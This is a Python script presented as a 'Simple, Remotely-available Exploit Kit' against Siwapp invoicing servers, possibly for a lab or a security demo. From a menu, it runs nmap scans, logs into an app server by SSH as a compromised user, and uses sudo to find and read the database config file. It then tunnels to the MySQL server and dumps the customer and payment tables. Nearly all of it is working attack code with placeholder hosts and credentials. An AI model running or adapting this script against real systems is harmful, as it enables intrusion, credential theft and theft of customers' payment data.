from consolemenu import *
from consolemenu.items import *
import subprocess
import pymysql
import paramiko
import pandas as pd
from paramiko import SSHClient
from sshtunnel import SSHTunnelForwarder
import os
from os.path import expanduser

#Identify absolute path to this script
dirname = os.path.dirname(os.path.abspath(__file__))

## IP OF SIWAPP APP SERVER AND USER (Make up a comprimised user on that host if needed)
hostname = "**IP OF ANY SIWAPP APP SERVER"
username = "**CHANGE ME**"
password = "**CHANGE ME**"

## These are the remote commands we will run on the comprimised APP server host
commands = [
    "sudo find /var/www/ -name database*",
    "sudo cat /var/www/html/config/databases.yml"
]

## This should be the IP of the DB server found  in the  /var/www/html/config/databases.yml file...
sql_hostname = '**CHANGE ME**'
sql_username = 'siwapp'
sql_password = 'siwapp'
sql_main_database = 'siwapp'
sql_port = 3306

def dbSearch():
    # initialize the SSH client
    client = paramiko.SSHClient()
    # add to known hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password)
    except:
        print("[!] Cannot connect to the SSH Server")
        exit()
    
    # execute the commands
    for command in commands:
        print("="*50, command, "="*50)
        stdin, stdout, stderr = client.exec_command(command)
        print(stdout.read().decode())
        err = stderr.read().decode()
        input("Press Enter to continue...")
        if err:
            print(err)

def flushTables():
    with SSHTunnelForwarder(
            (hostname, 22),
            ssh_username=username,
    		ssh_password=password,
            remote_bind_address=(sql_hostname, sql_port)) as tunnel:
        conn = pymysql.connect(host='127.0.0.1', user=sql_username,
                passwd=sql_password, db=sql_main_database,
                port=tunnel.local_bind_port)
        query = [
            '''SHOW TABLES;''',
            '''select * from customer;''',
            '''select * from payment;'''
        ]
            
        for command in query:
          print("="*50, command, "="*50)
          data = pd.read_sql_query(command, conn)
          print(data)
          input("Press Enter to continue...")

        conn.close()    

def simpleNmapScan():
    cmd = os.path.join(dirname, 'simpleNmap.bat')
    subprocess.call(cmd)

def aggressiveNmapScan():
    cmd = os.path.join(dirname, 'aggressiveNmap.bat')
    subprocess.call(cmd)

def main():
    # Create the menu
    menu = ConsoleMenu("Simple, Remotely-available Exploit Kit", "The answer is 42...")
    # A FunctionItem runs a Python function when selected
    simpleNmap = FunctionItem("Run a simple NMAP Scan", simpleNmapScan)
    aggressiveNmap = FunctionItem("Run a aggressive NMAP Scan", aggressiveNmapScan)
    databaseSearch = FunctionItem("Search for Database Files", dbSearch)
    flushDB = FunctionItem("Connect to and search DB", flushTables)

    # A CommandItem runs a console command
    
    # Once we're done creating them, we just add the items to the menu
    menu.append_item(simpleNmap)
    menu.append_item(aggressiveNmap)
    menu.append_item(databaseSearch)
    menu.append_item(flushDB)
    # Finally, we call show to show the menu and allow the user to interact
    menu.show()

if __name__ == '__main__':
    main()